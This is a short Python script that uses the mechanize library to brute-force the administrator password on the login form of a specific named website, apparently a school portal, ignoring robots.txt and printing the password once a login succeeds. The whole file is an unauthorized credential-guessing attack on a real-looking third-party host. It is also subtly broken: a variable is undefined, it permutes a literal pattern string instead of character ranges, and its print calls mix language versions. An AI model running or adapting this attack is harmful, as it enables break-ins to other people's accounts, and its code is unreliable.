import mechanize
import itertools

br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)  #no robots



combinations =itertools.permutations("a-zA-Z0-9!@#$%^",n)
br.open("http://npshsr.pupilpod.in")
for i in combinations:
	br.select_form(nr = 0)
	br.form['userName'] = 'admin'
	br.form['password'] = ''.join(i)
	print ("Checking "), br.form['password']
	response = br.submit()
	if response.geturl() == "http://npshsr.pupilpod.in": # url to which the page is redirected to after login
		print ("Correct password is"), ''.join(i)
		break


